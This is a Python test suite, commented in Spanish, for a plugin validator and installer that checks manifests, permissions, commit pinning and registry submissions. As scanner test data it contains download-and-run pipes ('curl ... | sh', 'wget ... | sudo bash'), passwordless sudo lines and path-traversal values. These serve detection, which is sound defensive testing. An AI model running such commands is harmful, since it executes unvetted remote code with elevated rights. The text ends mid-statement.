#!/usr/bin/env python3
"""Pruebas del catálogo de plugins: el guion que instala código de TERCEROS.

    python3 tools/prueba_plugins.py

`plugins.py` es la puerta de entrada de código ajeno a la barra: valida
manifiestos, casa permisos declarados contra lo que el QML usa de verdad, y
rechaza antes de tocar el disco. Que el editor tuviera setenta pruebas y
esta puerta ninguna era el desequilibrio más llamativo del proyecto.

Cada prueba fabrica su carpeta de plugin en un temporal: nada depende de lo
que haya en la máquina.
"""
import contextlib
import io
import json
import pathlib
import shutil
import subprocess
import struct
import sys
import tempfile
import zlib

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
import plugins
import publicar

fallos = []
BORRADOR = pathlib.Path(tempfile.mkdtemp(prefix="k4-prueba-plugins-"))
HOST = "1.1.0"


def igual(que, es, deberia):
    if es != deberia:
        fallos.append("%s\n      es: %r\n  debería: %r" % (que, es, deberia))


def contiene(que, texto, trozo):
    if trozo not in str(texto):
        fallos.append("%s\n      es: %r\n  debería contener: %r"
                      % (que, texto, trozo))


def carpeta(nombre, manifiesto=None, ficheros=None):
    """Una carpeta de plugin recién fabricada, con lo que se le pida."""
    d = BORRADOR / nombre
    d.mkdir(parents=True, exist_ok=True)
    for viejo in d.iterdir():
        viejo.unlink()
    if manifiesto is not None:
        (d / "plugin.json").write_text(json.dumps(manifiesto))
    for ruta, contenido in (ficheros or {}).items():
        modo = "wb" if isinstance(contenido, bytes) else "w"
        with open(d / ruta, modo) as f:
            f.write(contenido)
    return d


def manifiesto_base(ident):
    return {"id": ident, "entry": "Plugin.qml", "version": "1.0.0",
            "title": ident, "description": "prueba", "host": ">=1.0.0",
            "permisos": []}


def png(ancho, alto):
    """Un PNG mínimo pero legal: firma + IHDR con las medidas pedidas."""
    ihdr = struct.pack(">IIBBBBB", ancho, alto, 8, 2, 0, 0, 0)
    trozo = b"IHDR" + ihdr
    return (b"\x89PNG\r\n\x1a\n"
            + struct.pack(">I", len(ihdr)) + trozo
            + struct.pack(">I", zlib.crc32(trozo)))


# ── las piezas puras ─────────────────────────────────────────────────

def prueba_version_tupla():
    igual("una versión normal", plugins.version_tupla("1.2.3"), (1, 2, 3))
    igual("con basura devuelve None", plugins.version_tupla("uno.dos"), None)


def prueba_host_compatible():
    igual("sin requisito, compatible", plugins.host_compatible(None, HOST), True)
    igual("mayor cumple", plugins.host_compatible(">=1.0.0", HOST), True)
    igual("igual cumple", plugins.host_compatible(">=1.1.0", HOST), True)
    igual("menor no", plugins.host_compatible(">=2.0.0", HOST), False)
    igual("formato raro no cuela", plugins.host_compatible("^1.0.0", HOST), False)


# ── el veredicto de una carpeta ──────────────────────────────────────

def prueba_plugin_valido():
    d = carpeta("hola", manifiesto_base("hola"),
                {"Plugin.qml": "import QtQuick\nItem {}\n"})
    v = plugins.validar_carpeta(d, set(), HOST)
    igual("un plugin sano es cargable", v["cargable"], True)
    igual("la entrada sale absoluta", v["entry"], str(d / "Plugin.qml"))
    igual("y el qmldir se genera solo", (d / "qmldir").is_file(), True)
    contiene("con sus tipos dentro", (d / "qmldir").read_text(), "Plugin 1.0")


def prueba_sin_manifiesto():
    d = carpeta("roto")
    v = plugins.validar_carpeta(d, set(), HOST)
    igual("sin plugin.json no carga", v["cargable"], False)
    contiene("y lo dice", v["dice"], "plugin.json")


def prueba_manifiesto_ilegible():
    d = carpeta("basura", ficheros={"plugin.json": "{esto no es json"})
    v = plugins.validar_carpeta(d, set(), HOST)
    igual("json roto no carga", v["cargable"], False)
    contiene("con el motivo", v["dice"], "ilegible")


def prueba_id_invalido():
    d = carpeta("malo", dict(manifiesto_base("malo"), id="Con Mayúsculas"),
                {"Plugin.qml": "Item {}\n"})
    v = plugins.validar_carpeta(d, set(), HOST)
    igual("un id con mayúsculas y espacios no cuela", v["cargable"], False)


def prueba_id_no_coincide_con_carpeta():
    d = carpeta("una-cosa", manifiesto_base("otra-cosa"),
                {"Plugin.qml": "Item {}\n"})
    v = plugins.validar_carpeta(d, set(), HOST)
    igual("id distinto de la carpeta no carga", v["cargable"], False)
    contiene("y nombra a los dos", v["dice"], "otra-cosa")


def prueba_id_del_repo_gana():
    d = carpeta("game", manifiesto_base("game"), {"Plugin.qml": "Item {}\n"})
    v = plugins.validar_carpeta(d, {"game"}, HOST)
    igual("no se puede suplantar a uno de la barra", v["cargable"], False)


def prueba_entry_con_ruta():
    d = carpeta("listillo", dict(manifiesto_base("listillo"),
                                 entry="../fuera.qml"))
    v = plugins.validar_carpeta(d, set(), HOST)
    igual("una entry que sube por la ruta no carga", v["cargable"], False)


def prueba_entry_inexistente():
    d = carpeta("vacio", manifiesto_base("vacio"))
    v = plugins.validar_carpeta(d, set(), HOST)
    igual("sin el fichero de entrada no carga", v["cargable"], False)


def prueba_host_viejo():
    d = carpeta("futuro", dict(manifiesto_base("futuro"), host=">=9.0.0"),
                {"Plugin.qml": "Item {}\n"})
    v = plugins.validar_carpeta(d, set(), HOST)
    igual("pedir una barra que no existe no carga", v["cargable"], False)


# ── los permisos: el corazón de la puerta ────────────────────────────

def prueba_permiso_desconocido():
    d = carpeta("inventor", dict(manifiesto_base("inventor"),
                                 permisos=["superpoderes"]),
                {"Plugin.qml": "Item {}\n"})
    v = plugins.validar_carpeta(d, set(), HOST)
    igual("un permiso inventado no carga", v["cargable"], False)
    contiene("y se nombra", v["dice"], "superpoderes")


def prueba_usa_sin_declarar():
    d = carpeta("colado", manifiesto_base("colado"),
                {"Plugin.qml": "Item { K4.Process { command: [\"ls\"] } }\n"})
    v = plugins.validar_carpeta(d, set(), HOST)
    igual("usar K4.Process sin declararlo no carga", v["cargable"], False)
    #  El motivo es un código, para que la barra escriba la frase en el
    #  idioma del usuario; el permiso que falta va en el detalle, y la frase
    #  en español en `dice`, que es lo que lee quien está en una terminal.
    igual("con su código", v["motivo"], "sin-declarar")
    contiene("y el detalle dice cuál", v["detalle"], "procesos")
    contiene("y la frase sigue estando", v["dice"], "usa sin declarar")


def prueba_usa_declarado():
    d = carpeta("honesto", dict(manifiesto_base("honesto"),
                                permisos=["procesos"]),
                {"Plugin.qml": "Item { K4.Process { command: [\"ls\"] } }\n"})
    v = plugins.validar_carpeta(d, set(), HOST)
    igual("declarado, cargable", v["cargable"], True)


def prueba_comentario_no_delata():
    d = carpeta("comentado", manifiesto_base("comentado"),
                {"Plugin.qml": "Item {} // algún día usaré K4.Process\n"})
    v = plugins.validar_carpeta(d, set(), HOST)
    igual("hablar de K4.Process en un comentario no es usarlo",
          v["cargable"], True)


def prueba_huella_exige_permiso():
    d = carpeta("curioso", manifiesto_base("curioso"),
                {"Plugin.qml":
                 "Item { property var j: K4.Huella.steam.juegos }\n"})
    v = plugins.validar_carpeta(d, set(), HOST)
    igual("nombrar K4.Huella sin datos-personales no carga",
          v["cargable"], False)
    contiene("y el motivo lo dice", v["dice"], "datos-personales")


def prueba_portapapeles_delata_al_leer():
    d = carpeta("fisgon", manifiesto_base("fisgon"),
                {"Plugin.qml":
                 "Item { property var h: K4.Portapapeles.entradas }\n"})
    v = plugins.validar_carpeta(d, set(), HOST)
    igual("solo LEER el portapapeles ya exige permiso", v["cargable"], False)
    contiene("con su nombre", v["dice"], "portapapeles")


def prueba_la_vista_tambien_se_examina():
    d = carpeta("repartido", manifiesto_base("repartido"),
                {"Plugin.qml": "Item {}\n",
                 "Vista.qml": "Item { K4.Sonido { fuente: \"x.wav\" } }\n"})
    v = plugins.validar_carpeta(d, set(), HOST)
    igual("el permiso se busca en TODOS los .qml, no solo la entrada",
          v["cargable"], False)


# ── el icono ─────────────────────────────────────────────────────────

def prueba_icono_codice():
    d = carpeta("glifo", dict(manifiesto_base("glifo"), icono="0xF04E5"),
                {"Plugin.qml": "Item {}\n"})
    v = plugins.validar_carpeta(d, set(), HOST)
    igual("un códice vale", v["cargable"], True)
    igual("y queda apuntado", v["icono"], "0xF04E5")


def prueba_icono_inexistente():
    d = carpeta("sin-icono", dict(manifiesto_base("sin-icono"),
                                  icono="nada.png"),
                {"Plugin.qml": "Item {}\n"})
    v = plugins.validar_carpeta(d, set(), HOST)
    igual("un icono que no existe no carga", v["cargable"], False)


def prueba_icono_pequeno():
    d = carpeta("borroso", dict(manifiesto_base("borroso"), icono="i.png"),
                {"Plugin.qml": "Item {}\n", "i.png": png(32, 32)})
    v = plugins.validar_carpeta(d, set(), HOST)
    igual("un PNG de 32px no llega al mínimo", v["cargable"], False)
    contiene("y el motivo lo explica", v["dice"], "32x32")


def prueba_icono_decente():
    d = carpeta("nitido", dict(manifiesto_base("nitido"), icono="i.png"),
                {"Plugin.qml": "Item {}\n", "i.png": png(128, 128)})
    v = plugins.validar_carpeta(d, set(), HOST)
    igual("un PNG de 128px carga", v["cargable"], True)
    contiene("con su ruta absoluta", v["iconoFichero"], str(d / "i.png"))


def prueba_icono_con_ruta():
    d = carpeta("ladron", dict(manifiesto_base("ladron"),
                               icono="../../otro.png"),
                {"Plugin.qml": "Item {}\n"})
    v = plugins.validar_carpeta(d, set(), HOST)
    igual("un icono con ruta no cuela", v["cargable"], False)


# ── el registro, que es un PR de un desconocido ──────────────────────

def _reg(**e):
    """Los fallos que da una entrada de registro suelta."""
    base = {"id": "x", "title": "X", "description": "d",
            "repo": "https://ejemplo/repo"}
    base.update(e)
    fallos_reg = []
    plugins.validar_registro({"plugins": [base]}, fallos_reg)
    return fallos_reg


def prueba_registro_entrada_correcta():
    igual("una entrada bien puesta no da fallos",
          _reg(commit="a" * 40, carpeta="ejemplos/x"), [])


def prueba_registro_commit_entero_o_ninguno():
    #  Medio ancla no ancla: un SHA corto no identifica un commit sin
    #  ambigüedad, y uno en mayúsculas no casa con lo que devuelve git.
    igual("un sha corto no vale", len(_reg(commit="abc123")), 1)
    igual("en mayúsculas tampoco", len(_reg(commit="A" * 40)), 1)
    igual("una rama menos todavía", len(_reg(commit="main")), 1)
    igual("sin commit se acepta, que la transición dura",
          _reg(), [])


def prueba_registro_campos_y_forma():
    igual("hace falta title", len(_reg(title="")), 1)
    igual("hace falta description", len(_reg(description=None)), 1)
    igual("el repo es una URL", len(_reg(repo="git@github:a/b")), 1)
    igual("el id tiene formato", len(_reg(id="Mal Id")), 1)


def prueba_registro_carpeta_no_se_escapa():
    #  La carpeta acaba concatenada a un clon temporal. Con `..` dentro,
    #  apuntaría fuera de él.
    igual("nada de ..", len(_reg(carpeta="../fuera")), 1)
    igual("ni absoluta", len(_reg(carpeta="/etc")), 1)
    igual("una normal pasa", _reg(carpeta="ejemplos/x"), [])


def prueba_registro_sin_ids_repetidos():
    fallos_reg = []
    plugins.validar_registro({"plugins": [
        {"id": "x", "title": "X", "description": "d", "repo": "https://a/b"},
        {"id": "x", "title": "Y", "description": "d", "repo": "https://a/c"},
    ]}, fallos_reg)
    igual("dos entradas con el mismo id", len(fallos_reg), 1)


def prueba_registro_de_verdad_es_valido():
    #  El que se publica, no uno de mentira.
    if plugins.FICHERO_REGISTRO.is_file():
        fallos_reg = []
        plugins.validar_registro(
            json.loads(plugins.FICHERO_REGISTRO.read_text()), fallos_reg)
        igual("el registro que publicamos pasa su propio validador",
              fallos_reg, [])


# ── el ancla: instalar UN commit, y saber cuál ───────────────────────
#
#  Estas se instalan de verdad, pero NUNCA en `~/.config/k4/plugins`: se
#  redirige `plugins.DE_USUARIO` a un temporal. Una prueba que te toque los
#  plugins de verdad es una prueba que no puedes correr con la barra abierta.

def _git(d, *args):
    subprocess.run(["git", "-C", str(d)] + list(args),
                   check=True, capture_output=True)


def repo_con_dos_commits(nombre="anclado", dentro=""):
    """Un repo git de mentira con un plugin y dos versiones de él.

    Devuelve (ruta, sha_viejo, sha_nuevo). El plugin cambia de versión entre
    los dos commits, que es lo que deja ver cuál se instaló de verdad.
    """
    d = BORRADOR / ("repo-" + nombre)
    if d.exists():
        shutil.rmtree(d)
    base = (d / dentro) if dentro else d
    base.mkdir(parents=True)
    _git_init = subprocess.run(["git", "init", "-q", "-b", "main", str(d)],
                               check=True, capture_output=True)
    _git(d, "config", "user.email", "prueba@k4")
    _git(d, "config", "user.name", "prueba")

    man = manifiesto_base(nombre)
    (base / "plugin.json").write_text(json.dumps(man))
    (base / "Plugin.qml").write_text("import QtQuick\nItem {}\n")
    _git(d, "add", "-A")
    _git(d, "commit", "-q", "-m", "uno")
    viejo = subprocess.run(["git", "-C", str(d), "rev-parse", "HEAD"],
                           capture_output=True, text=True).stdout.strip()

    man["version"] = "2.0.0"
    (base / "plugin.json").write_text(json.dumps(man))
    _git(d, "add", "-A")
    _git(d, "commit", "-q", "-m", "dos")
    nuevo = subprocess.run(["git", "-C", str(d), "rev-parse", "HEAD"],
                           capture_output=True, text=True).stdout.strip()
    return d, viejo, nuevo


class DestinoAparte:
    """Mientras dure, `plugins.DE_USUARIO` apunta a un temporal."""

    def __init__(self, nombre):
        self.d = BORRADOR / ("destino-" + nombre)

    def __enter__(self):
        if self.d.exists():
            shutil.rmtree(self.d)
        self.d.mkdir(parents=True)
        self.antes = plugins.DE_USUARIO
        plugins.DE_USUARIO = self.d
        #  Instalar habla mucho —permisos, destino, el aviso de que esto no es
        #  una jaula— y está bien que hable. Aquí no: ocho instalaciones dejan
        #  la salida de las pruebas ilegible y lo único que importa es la
        #  última línea. Se guarda por si una falla y hay que mirarla.
        self.dicho = io.StringIO()
        self.silencio = contextlib.redirect_stdout(self.dicho)
        self.silencio.__enter__()
        return self.d

    def __exit__(self, *_):
        self.silencio.__exit__(None, None, None)
        plugins.DE_USUARIO = self.antes
        return False


def arbol(d):
    """Qué ficheros hay y qué contienen, para comparar dos instalaciones."""
    fuera = {}
    for f in sorted(d.rglob("*")):
        if f.is_file():
            fuera[str(f.relative_to(d))] = f.read_bytes()
    return fuera


def prueba_ancla_instala_el_commit_pedido():
    repo, viejo, nuevo = repo_con_dos_commits("pedido")
    with DestinoAparte("pedido") as destino:
        igual("instala sin quejarse",
              plugins.instalar(str(repo), True, None, viejo), 0)
        o = json.loads((destino / "pedido" / plugins.ORIGEN).read_text())
        igual("apunta el commit que se pidió", o["commit"], viejo)
        man = json.loads((destino / "pedido" / "plugin.json").read_text())
        igual("y el contenido es el de ESE commit, no el de la punta",
              man["version"], "1.0.0")


def prueba_ancla_sin_pedir_commit_va_a_la_punta():
    repo, viejo, nuevo = repo_con_dos_commits("punta")
    with DestinoAparte("punta") as destino:
        igual("instala", plugins.instalar(str(repo), True), 0)
        o = json.loads((destino / "punta" / plugins.ORIGEN).read_text())
        igual("apunta la punta", o["commit"], nuevo)
        igual("y aun sin pedirlo, queda apuntado",
              plugins.RE_SHA.fullmatch(o["commit"]) is not None, True)


def prueba_ancla_actualizar_lleva_al_commit_dado():
    repo, viejo, nuevo = repo_con_dos_commits("subir")
    with DestinoAparte("subir") as destino:
        plugins.instalar(str(repo), True, None, viejo)
        igual("actualiza al commit pedido",
              plugins.actualizar("subir", True, nuevo), 0)
        o = json.loads((destino / "subir" / plugins.ORIGEN).read_text())
        igual("y queda en él", o["commit"], nuevo)
        man = json.loads((destino / "subir" / "plugin.json").read_text())
        igual("con el contenido nuevo", man["version"], "2.0.0")


def prueba_ancla_actualizar_conserva_la_subcarpeta():
    #  El fallo que había: solo se guardaba la URL, así que actualizar un
    #  plugin que vive en una subcarpeta del repo tenía que volver a
    #  adivinarla. Con dos candidatos ya no podía.
    repo, viejo, nuevo = repo_con_dos_commits("dentro", dentro="ejemplos/dentro")
    (repo / "otro").mkdir()
    (repo / "otro" / "plugin.json").write_text(
        json.dumps(manifiesto_base("otro")))
    (repo / "otro" / "Plugin.qml").write_text("import QtQuick\nItem {}\n")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "un segundo candidato")

    with DestinoAparte("dentro") as destino:
        igual("instala diciendo la carpeta",
              plugins.instalar(str(repo), True, "ejemplos/dentro"), 0)
        o = json.loads((destino / "dentro" / plugins.ORIGEN).read_text())
        igual("la carpeta queda apuntada", o["carpeta"], "ejemplos/dentro")
        igual("y actualizar la encuentra sola",
              plugins.actualizar("dentro", True), 0)


def prueba_ancla_mismo_commit_mismo_arbol():
    repo, viejo, nuevo = repo_con_dos_commits("gemelo")
    with DestinoAparte("gemelo-a") as a:
        plugins.instalar(str(repo), True, None, viejo)
        uno = arbol(a / "gemelo")
    with DestinoAparte("gemelo-b") as b:
        plugins.instalar(str(repo), True, None, viejo)
        dos = arbol(b / "gemelo")
    #  El papel del origen lleva la hora dentro, así que ese no se compara:
    #  lo que tiene que salir idéntico es el CÓDIGO.
    uno.pop(plugins.ORIGEN, None)
    dos.pop(plugins.ORIGEN, None)
    igual("el mismo commit da el mismo árbol, dos veces", uno, dos)
    igual("y no está vacío", len(uno) > 0, True)


def prueba_ancla_rechaza_un_commit_que_no_lo_es():
    repo, viejo, nuevo = repo_con_dos_commits("raro")
    with DestinoAparte("raro") as destino:
        igual("una rama no vale como ancla",
              plugins.instalar(str(repo), True, None, "main"), 1)
        igual("ni un sha corto",
              plugins.instalar(str(repo), True, None, viejo[:8]), 1)
        igual("y no ha instalado nada", list(destino.iterdir()), [])


def prueba_ancla_rechaza_un_commit_inexistente():
    repo, viejo, nuevo = repo_con_dos_commits("fantasma")
    with DestinoAparte("fantasma") as destino:
        igual("un commit que no está en ese repo",
              plugins.instalar(str(repo), True, None, "0" * 40), 1)
        igual("y no ha instalado nada", list(destino.iterdir()), [])


def prueba_ancla_lee_el_origen_de_antes():
    #  Lo ya instalado con la versión vieja no puede quedarse tirado: se sabe
    #  de dónde vino aunque no en qué commit.
    with DestinoAparte("viejo") as destino:
        d = destino / "antiguo"
        d.mkdir()
        (d / ".origen").write_text("https://ejemplo/repo\n")
        o = plugins.leer_origen("antiguo")
        igual("se lee el repo", o["repo"], "https://ejemplo/repo")
        igual("y no se inventa un commit", o.get("commit", ""), "")


# ── lo que la barra le pregunta al guion ─────────────────────────────

def dice(fn, *a, **k):
    """Lo que una orden en modo JSON contesta, ya como objeto."""
    salida = io.StringIO()
    with contextlib.redirect_stdout(salida):
        fn(*a, **k)
    return json.loads(salida.getvalue().strip().splitlines()[-1])


def prueba_json_examinar_no_instala_nada():
    #  El examen es la mitad de arriba del diálogo de permisos: tiene que
    #  poder mirar sin tocar el disco. Si instalara, aceptar o cancelar daría
    #  igual, que es justo lo contrario de un consentimiento.
    repo, viejo, nuevo = repo_con_dos_commits("examen")
    with DestinoAparte("examen") as destino:
        d = dice(plugins.json_examinar, str(repo), None, viejo)
        igual("dice que sí", d["ok"], True)
        igual("y qué commit ha visto", d["commit"], viejo)
        igual("con los datos del manifiesto", d["plugin"]["id"], "examen")
        igual("sabe que va anclado", d["anclado"], True)
        igual("y NO ha instalado nada", list(destino.iterdir()), [])


def prueba_json_examinar_dice_por_que_no():
    repo, viejo, nuevo = repo_con_dos_commits("examen-malo")
    with DestinoAparte("examen-malo"):
        d = dice(plugins.json_examinar, str(repo), None, "0" * 40)
        igual("no cuela", d["ok"], False)
        #  Un código, no una frase: la frase la escribe la barra en el idioma
        #  del usuario. Ver `Idioma.porque()`.
        igual("y dice cuál es el problema", d["motivo"], "sin-commit")
        contiene("con el commit en el detalle", d["detalle"], "000000000000")


def prueba_json_examinar_avisa_de_que_reemplaza():
    repo, viejo, nuevo = repo_con_dos_commits("otra-vez")
    with DestinoAparte("otra-vez"):
        plugins.instalar(str(repo), True, None, viejo)
        d = dice(plugins.json_examinar, str(repo), None, nuevo)
        igual("avisa de que ya está", d["reemplaza"], True)
        igual("y de en qué commit estaba", d["commitAnterior"], viejo)


def prueba_json_buscar_marca_lo_que_tienes():
    repo, viejo, nuevo = repo_con_dos_commits("de-mentira-tienda")
    reg = BORRADOR / "registro-prueba.json"
    reg.write_text(json.dumps({"plugins": [
        {"id": "de-mentira-tienda", "title": "T", "description": "d",
         "repo": "https://ejemplo/t", "commit": viejo},
        {"id": "otro-que-no-tengo", "title": "O", "description": "d",
         "repo": "https://ejemplo/o", "commit": nuevo},
    ]}))
    with DestinoAparte("de-mentira-tienda"):
        plugins.instalar(str(repo), True, None, viejo)
        d = dice(plugins.json_buscar, reg.as_uri())
        por_id = {p["id"]: p for p in d["plugins"]}
        igual("sabe cuál tienes", por_id["de-mentira-tienda"]["instalado"], True)
        igual("y que está al día", por_id["de-mentira-tienda"]["alDia"], True)
        igual("y cuál no tienes",
              por_id["otro-que-no-tengo"]["instalado"], False)


def prueba_json_buscar_descarta_lo_roto():
    #  Un PR con una entrada mal puesta no puede dejar la tienda en blanco.
    reg = BORRADOR / "registro-roto.json"
    reg.write_text(json.dumps({"plugins": [
        {"id": "bueno", "title": "B", "description": "d",
         "repo": "https://ejemplo/b"},
        {"id": "malo", "title": "M", "description": "d",
         "repo": "https://ejemplo/m", "commit": "corto"},
    ]}))
    with DestinoAparte("roto"):
        d = dice(plugins.json_buscar, reg.as_uri())
        igual("sirve lo bueno", [p["id"] for p in d["plugins"]], ["bueno"])
        igual("y dice qué descartó", d["descartadas"], ["malo"])


def prueba_superficies_llegan_al_resultado():
    #  Se validaban y se tiraban: el manifiesto declaraba `island` y la tienda
    #  recibía una lista vacía. Toda la gracia de las superficies es que
    #  alguien las VEA antes de encender el plugin, así que si no viajan, no
    #  sirven de nada.
    d = carpeta("con-superficie",
                dict(manifiesto_base("con-superficie"), superficies=["island"]),
                {"Plugin.qml": "import QtQuick\nItem {}\n"})
    v = plugins.validar_carpeta(d, set(), HOST)
    igual("carga", v["cargable"], True)
    igual("y las superficies llegan", v.get("superficies"), ["island"])

    #  Sin declararlas, no se inventa ninguna.
    d2 = carpeta("sin-superficie", manifiesto_base("sin-superficie"),
                 {"Plugin.qml": "import QtQuick\nItem {}\n"})
    v2 = plugins.validar_carpeta(d2, set(), HOST)
    igual("y sin declararlas no aparecen", v2.get("superficies"), None)


# ── las reglas con nombre ────────────────────────────────────────────

def con_ficheros(nombre, ficheros):
    d = BORRADOR / ("reglas-" + nombre)
    if d.exists():
        shutil.rmtree(d)
    d.mkdir(parents=True)
    for ruta, contenido in ficheros.items():
        f = d / ruta
        f.parent.mkdir(parents=True, exist_ok=True)
        f.write_text(contenido)
    return d


def ids_de(d):
    return sorted(r["id"] for r in plugins.revisar_reglas(d))


def prueba_reglas_descarga_y_ejecuta():
    d = con_ficheros("curl", {
        "i.sh": "#!/bin/sh\ncurl -sL https://x/y.sh | sh\n"})
    igual("curl a la shell", ids_de(d), ["descarga-y-ejecuta"])
    d = con_ficheros("curl2", {
        "i.sh": "wget -qO- https://x/y | sudo bash\n"})
    igual("y con wget y sudo también", ids_de(d), ["descarga-y-ejecuta"])
    d = con_ficheros("curl-ok", {
        "i.sh": "curl -sL https://x/datos.json -o datos.json\n"})
    igual("bajar un fichero y ya, no", ids_de(d), [])


def prueba_reglas_sudo_sin_contrasena():
    d = con_ficheros("sudo", {"i.sh": "sudo -n systemctl restart x\n"})
    igual("sudo -n", ids_de(d), ["sudo-sin-contrasena"])
    d = con_ficheros("nopass", {"i.sh": "# NOPASSWD: /usr/bin/x\n"})
    igual("NOPASSWD", ids_de(d), ["sudo-sin-contrasena"])


def prueba_reglas_qml_desde_texto():
    d = con_ficheros("qml", {
        "V.qml": "import QtQuick\nItem { function f(t) "
                 "{ return Qt.createQmlObject(t, this) } }\n"})
    igual("QML de una cadena", ids_de(d), ["qml-desde-texto"])


def prueba_reglas_no_miran_la_documentacion():
    #  Un README con un ejemplo de `curl | sh` no es el plugin haciéndolo.
    d = con_ficheros("doc", {
        "LEEME.md": "Instálalo así: curl -sL https://x/y | sh\n"})
    igual("la documentación no cuenta", ids_de(d), [])


def prueba_reglas_solo_dos_bloquean():
    #  Bloquear se reserva para lo inequívoco. Lo demás marca el envío para
    #  que lo lea una persona, que es distinto de pararlo.
    igual("las que bloquean",
          sorted(r["id"] for r in plugins.REGLAS if r["bloquea"]),
          ["descarga-y-ejecuta", "sudo-sin-contrasena"])


def prueba_reglas_dicen_como_arreglarse():
    #  Un aviso que no dice qué hacer se ignora, y entonces da igual tenerlo.
    for r in plugins.REGLAS:
        igual("%s explica por qué" % r["id"], len(r["porque"]) > 30, True)
        igual("%s dice qué hacer" % r["id"], len(r["arreglo"]) >= 1, True)


def prueba_reglas_no_saltan_con_los_plugins_de_casa():
    #  Los 27 del repo son el patrón de referencia: si una regla salta ahí, o
    #  el plugin está mal o la regla es demasiado ansiosa.
    saltan = []
    for d in sorted((plugins.RAIZ / "plugins").iterdir()):
        if d.is_dir():
            for r in plugins.revisar_reglas(d):
                if r["bloquea"]:
                    saltan.append("%s: %s" % (d.name, r["donde"]))
    igual("ninguna bloqueante en los plugins de casa", saltan, [])


# ── las banderas, en los dos idiomas ─────────────────────────────────

def prueba_banderas_en_ingles():
    #  La puerta se escribe en inglés porque a un ecosistema entra gente que
    #  no habla español. Que el código de dentro siga en español no es
    #  contradicción: una bandera no es código, es la puerta.
    igual("--install es --instalar",
          plugins.traducir_banderas(["x", "--install", "u"]),
          ["x", "--instalar", "u"])
    igual("y --test es --probar",
          plugins.traducir_banderas(["x", "--test", "id"]),
          ["x", "--probar", "id"])


def prueba_banderas_en_espanol_siguen_valiendo():
    #  Están en el README, en guiones de gente y en los dedos de quien lleva
    #  meses usándolas. Retirarlas costaría más de lo que ahorra.
    for vieja in ("--instalar", "--probar", "--nuevo", "--comprobar",
                  "--buscar", "--quitar", "--actualizar", "--examinar",
                  "--listar", "--instalados", "--si", "--carpeta"):
        igual("%s sigue llegando entera" % vieja,
              plugins.traducir_banderas(["x", vieja]), ["x", vieja])


def prueba_ninguna_bandera_se_come_a_otra():
    #  `--instalar` sustituido antes que `--instalados` daría «--installdos».
    #  Es el fallo clásico de traducir por reemplazo y aquí no puede pasar,
    #  porque se traduce argumento a argumento y no por texto.
    igual("--installed no se convierte en --install + dos",
          plugins.traducir_banderas(["x", "--installed"]), ["x", "--instalados"])
    igual("y lo que no conoce lo deja en paz",
          plugins.traducir_banderas(["x", "--inventada", "--commit", "abc"]),
          ["x", "--inventada", "--commit", "abc"])


# ── el proceso de publicación ────────────────────────────────────────
#
#  Es la puerta por la que entra código de un desconocido al registro, así que
#  lo que se prueba aquí es sobre todo lo que tiene que RECHAZAR.

def formulario(repo="https://github.com/quien/que",
               commit="a" * 40, carpeta="_No response_"):
    return ("### Repositorio\n\n%s\n\n### Commit\n\n%s\n\n"
            "### Carpeta\n\n%s\n" % (repo, commit, carpeta))


def prueba_publicar_lee_el_formulario_en_ingles():
    #  El formulario de verdad está en inglés —lo rellena gente de fuera— pero
    #  los rótulos en español se siguen leyendo: hubo envíos con ellos y no
    #  pueden dejar de entenderse porque cambiásemos la plantilla.
    cuerpo = ("### Repository\n\nhttps://github.com/quien/que\n\n"
              "### Commit\n\n%s\n\n### Folder\n\nexamples/x\n" % ("a" * 40))
    d, malos = publicar.envio(cuerpo)
    igual("sin quejas", malos, [])
    igual("el repo", d["repo"], "https://github.com/quien/que")
    igual("la carpeta", d["carpeta"], "examples/x")


def prueba_publicar_lee_el_formulario():
    d, malos = publicar.envio(formulario(carpeta="ejemplos/x"))
    igual("sin quejas", malos, [])
    igual("el repo", d["repo"], "https://github.com/quien/que")
    igual("el commit", d["commit"], "a" * 40)
    igual("la carpeta", d["carpeta"], "ejemplos/x")


def prueba_publicar_carpeta_vacia_es_vacia():
    #  «_No response_» es lo que escribe GitHub en un campo opcional en blanco.
    #  Tomarlo como nombre de carpeta buscaría un plugin llamado así.
    d, malos = publicar.envio(formulario())
    igual("no se cuela el relleno de GitHub", d["carpeta"], "")


def prueba_publicar_exige_un_commit_de_verdad():
    for malo in ("main", "HEAD", "a" * 39, "a" * 41, "z" * 40, ""):
        d, malos = publicar.envio(formulario(commit=malo))
        igual("no cuela el commit %r" % malo, len(malos) >= 1, True)


def prueba_publicar_normaliza_el_commit():
    #  Un SHA en mayúsculas es el MISMO commit, así que se acepta y se pasa a
    #  minúsculas en vez de rechazarlo: el registro lo guarda en un solo
    #  formato y comparar dos SHA no puede depender de cómo lo pegaron.
    d, malos = publicar.envio(formulario(commit="A" * 40))
    igual("se acepta", malos, [])
    igual("y queda en minúscula", d["commit"], "a" * 40)


def prueba_publicar_exige_un_repo_de_github():
    for malo in ("git@github.com:a/b.git", "https://gitlab.com/a/b",
                 "https://github.com/a/b/c", "ftp://github.com/a/b"):
        d, malos = publicar.envio(formulario(repo=malo))
        igual("no cuela el repo %r" % malo, len(malos) >= 1, True)
    d, malos = publicar.envio(formulario(repo="https://github.com/a/b/"))
    igual("la barra final se quita", d["repo"], "https://github.com/a/b")


def prueba_publicar_carpeta_no_se_escapa():
    d, malos = publicar.envio(formulario(carpeta="../../etc"))
    igual("nada de ..", len(malos), 1)
    d, malos = publicar.envio(formulario(carpeta="/etc"))
    igual("ni absoluta", len(malos), 1)


def prueba_publicar_no_firma_otro_commit():
    #  El corazón del asunto: se revisa un commit y se aprueba ese. Si entre
    #  medias cambia, publicar tiene que pararse — si no, aprobar sería
    #  aprobar «ese repositorio», que es una promesa que nadie puede cumplir.
    d = {"repo": "https://github.com/quien/que", "commit": "a" * 40,
         "carpeta": ""}
    res = {"ok": True, "commit": "b" * 40,
           "plugin": {"id": "x", "title": "X", "description": "d"}}
    igual("no publica un commit distinto del revisado",
          publicar.anadir(d, res), 1)


def prueba_publicar_marca_para_revision_si_pide_permisos():
    d = {"repo": "https://github.com/quien/que", "commit": "a" * 40,
         "carpeta": ""}
    limpio = {"ok": True, "commit": "a" * 40,
              "plugin": {"id": "sin-permisos", "title": "X",
                         "description": "d", "permisos": []}}
    _, etiqueta = publicar.informe(d, [], limpio)
    igual("sin permisos, validado", etiqueta, "validado")

    pide = {"ok": True, "commit": "a" * 40,
            "plugin": {"id": "con-permisos", "title": "X",
                       "description": "d", "permisos": ["procesos"]}}
    _, etiqueta = publicar.informe(d, [], pide)
    igual("pidiendo permisos, lo mira una persona",
